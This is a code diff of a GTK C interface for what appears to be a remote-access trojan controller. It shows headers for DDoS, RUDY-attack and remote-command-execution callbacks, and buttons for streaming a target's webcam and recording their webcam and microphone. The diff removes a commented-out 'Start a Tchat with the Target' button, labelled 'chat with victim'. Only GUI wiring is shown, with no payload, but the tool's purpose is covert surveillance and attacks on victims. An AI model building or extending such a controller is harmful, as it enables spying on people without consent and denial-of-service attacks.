@@ -22,8 +22,6 @@
 #include "../includes/callbacks_ddos.h"
 #include "../includes/callbacks_rudy_arme_ddos.h"
 #include "../includes/callbacks_execute_commands.h"
-#include "../includes/callbacks_tchat.h"
-
 
 GtkWidget *main_win = NULL;
 
@@ -32,8 +30,8 @@ GtkWidget *rs_text_view = NULL;
 GtkWidget *definition_text_view_2 = NULL;
 GtkWidget *ddos_text_view = NULL;
 GtkWidget *historic_text_view = NULL;
-GtkWidget *upload_entry = NULL;
 
+GtkWidget *upload_entry = NULL;
 GtkWidget *zone[6] = {NULL};
 
 
@@ -147,10 +145,6 @@ void fill_window(char *argv[])
     GtkWidget *stream_webcam = NULL;
     GtkWidget *record_webcam = NULL;
     GtkWidget *record_micro = NULL;
-    
-    /* Start a tchat vars */
-    GtkWidget *start_tchat = NULL;
-    
 
     /** Initialize the zone[0] for blit widgets **/
     zone[0] = gtk_fixed_new();
@@ -636,14 +630,6 @@ void fill_window(char *argv[])
     gtk_widget_set_size_request(record_micro, 200, 30);
     gtk_fixed_put(GTK_FIXED(zone[0]), record_micro, 850, 200);
     g_signal_connect(G_OBJECT(record_micro), "clicked", G_CALLBACK(cb_record_micro), NULL);
-    
-    
-    /*  START TCHAT WITH VICTIM */
-    
-    //start_tchat = gtk_button_new_with_label("Start a Tchat with the Target.");
-    //gtk_widget_set_size_request(start_tchat, 200, 30);
-    //gtk_fixed_put(GTK_FIXED(zone[0]), start_tchat, 850, 250);
-    //g_signal_connect(G_OBJECT(start_tchat), "clicked", G_CALLBACK(cb_start_tchat), NULL);
     
     /** TAB CLIENTS */
     
